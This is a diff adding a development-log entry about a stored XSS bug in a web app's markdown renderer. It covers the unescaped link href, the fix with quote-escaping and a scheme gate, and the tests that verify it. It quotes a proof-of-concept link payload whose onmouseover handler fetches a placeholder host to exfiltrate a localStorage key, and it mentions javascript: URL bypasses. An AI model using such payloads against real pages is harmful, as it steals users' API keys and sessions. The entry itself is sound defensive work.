@@ -34166,3 +34166,129 @@ foreign session owns and this change never touches). This change covers
 `src/cafresohq_state/main.mo` was never staged or edited, no II or
 `derivationOrigin` value was read or written, and no dfx/IC action of any kind
 was run.
+
+---
+
+## 293. a link in a note could hang a script on the office
+
+**The reading.** Twin of `#254` — and more precisely, twin of the one thing
+`#254` waved through. That entry closed the `.svg` preview hole in
+`views/ide.jsx`, then swept the whole file for any other
+`dangerouslySetInnerHTML` fed from file bytes, and found one it decided was
+fine. Its own words: *"(`renderMarkdown` is the one allowed source: it
+entity-escapes before it looks for syntax.)"*
+
+That sentence is true of the **text** `renderMarkdown` emits and false of the
+**attributes** it emits, and the function itself knows this. `esc` at
+`views/ide.jsx:28` is:
+
+```js
+const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+```
+
+Three characters. Not the double quote. Which is exactly why every attribute
+this function writes carries its own escape, one call site after another:
+
+| line | attribute | escape |
+|---|---|---|
+| 52 | `![[embed]]` → `<img src>` | `.replace(/"/g, '&quot;')` |
+| 53 | `![[embed]]` → `<img alt>` | `.replace(/"/g, '&quot;')` |
+| 57, 66 | `[[wikilink]]` → `data-wikilink` | `.replace(/"/g, '&quot;')` |
+| 88 | `![](src)` → `<img src>` | `.replace(/"/g, '&quot;')` |
+| 92 | `![](src)` → `<img alt>` | `.replace(/"/g, '&quot;')` |
+| **95** | **`[label](url)` → `<a href>`** | **none** |
+
+Six attribute sites; five of them escape, one interpolates raw. The odd one
+out was the markdown link:
+
+```js
+s = s.replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2">$1</a>');
+```
+
+**The bug.** `views/ide.jsx:95`. A `.md` file containing
+
+```markdown
+[report](" onmouseover="fetch('https://x/'+localStorage.cafresohq_key))
+```
+
+rendered as `<a href="" onmouseover="fetch(…)">report</a>`. The URL ended the
+`href` attribute and everything after it became attributes of the anchor — an
+event handler on an element the boss is being invited to click. `esc` never
+saw a quote to escape; `$2` never asked it to.
+
+`[x](javascript:…)` is the same hole with no quote required at all: the href
+stood as written, and clicking the link ran it.
+
+Both land in **exactly the two surfaces `#254` was about**, both
+`dangerouslySetInnerHTML`, both fed by files the office did not write:
+
+- `views/ide.jsx:661` — `FilePreview`, the "universal artifact preview", one
+  click on a `LocalTree` row: `renderMarkdown(file.content || '')`.
+- `views/vault.jsx:1658` and `:1740` — the Library note preview:
+  `renderMarkdown(openNote.content, { wikilinks: true, … })`.
+
+So the reachable set is every `.md` in the workspace and every note in the
+Library: a cloned repo's README, a file an agent downloaded, a deliverable a
+coworker wrote, a note the vault backend synced. `#254` enumerated what the
+origin holds and the enumeration is unchanged — the Internet Identity
+session, the BYOK `anthropic`/`openai`/`google` keys, every `cafresohq_*` key
+in `localStorage`. `#254` bolted the `.svg` door and left the `.md` one
+ajar, in the same file, in the same sweep, with a comment saying so.
+
+The contrast is not hypothetical: `graph-viewer.js:1271` builds anchors from
+note sources with an `esc` that **does** include `"`, and quotes its hrefs
+through it. The office already had the right shape; this call site was not
+using it.
+
+**The fix.** The link arm becomes a callback and joins its five neighbours —
+the same `.replace(/"/g, '&quot;')` they use, so a URL can no longer end the
+attribute — plus a scheme gate, because a `javascript:`/`vbscript:`/`data:`
+href needs no quote. The scheme is tested against the URL with control
+characters and spaces removed (a browser strips those before it parses the
+scheme, so `java\tscript:` is a `javascript:` URL); a blocked scheme renders
+as `href="#"`, the link still visible, going nowhere. `https:`, relative and
+`/`-rooted links are untouched. The `![](src)` arm above needs no scheme gate
+— an `<img src>` executes nothing — but it did already quote-escape, which is
+the whole point: this arm now matches it.
+
+**The proof.**
+`scripts/test_a_link_in_a_note_cannot_hang_a_script_on_the_page.py` lifts the
+**shipped** `renderMarkdown` out of `views/ide.jsx` by brace-matching and runs
+it under Node, so what is tested is the function the office ships rather than
+a re-implementation that would agree with itself. Both the comment stripper
+and the brace matcher skip regex literals, because this file's own
+`replace(/"/g, …)` otherwise opens a double-quoted string that swallows the
+next hundred lines — and comments are stripped **first**, so the fix's own
+explanatory comment (which quotes the vulnerable `href="$2"` spelling
+verbatim) cannot make the correct code read as the bug.
+
+Eleven checks: the raw-interpolation spelling is gone from the source; the
+quote payload comes out escaped *inside* the href rather than absent (the
+bytes survive, only their power to end the attribute does not); `javascript:`,
+`JaVaScRiPt:`, `java\tscript:` and `vbscript:` are all defused; a plain
+`https://` link and a relative `./sub/other.md` link still render exactly as
+before; every anchor the function emits matches `<a href="…">` and nothing
+else, so any future URL that could end the attribute shows up as a stray tag
+here; and the family rule itself is pinned — at least five quote-escaping
+attribute sites remain in the function.
+
+Fire-tested: copied the fixed `views/ide.jsx` to `/tmp`, reverted the escape
+in place with the editor (never `git checkout -- <file>`) to `const safe =
+href;` — 6 of 11 checks failed, exit 1, the structural check reporting the
+stray anchor `<a href="" onmouseover="alert(1">`. (The source-shape check
+still passed under that revert, since the revert kept the callback spelling
+and only removed the escaping; the behavioural checks are what catch it.)
+Restored from the `/tmp` copy, confirmed byte-identical by `md5`
+(`b0d19ffb08473b14c35ae6ae95ae0036`), reran — 11 of 11 passed, exit 0.
+
+`npm run build` was run once up front so `dist-ui/manifest.json` exists in a
+fresh worktree, and again after the `.jsx` edit.
+
+**Suite:** `python3 scripts/run_tests.py` — expected sole pre-existing failure
+`scripts/test_worker_payout_sweep_does_not_wipe_mid_sweep_accrual.py` (the
+`moc`/M0219 `main.mo` toolchain mismatch tracked from `#188` onward, on a file
+a foreign session owns and this change never touches). This change covers only
+`views/ide.jsx`, the one new test file, and this entry; no existing test was
+changed; `src/cafresohq_state/main.mo` was never staged or edited, no II or
+`derivationOrigin` value was read or written, and no dfx/IC action of any kind
+was run.
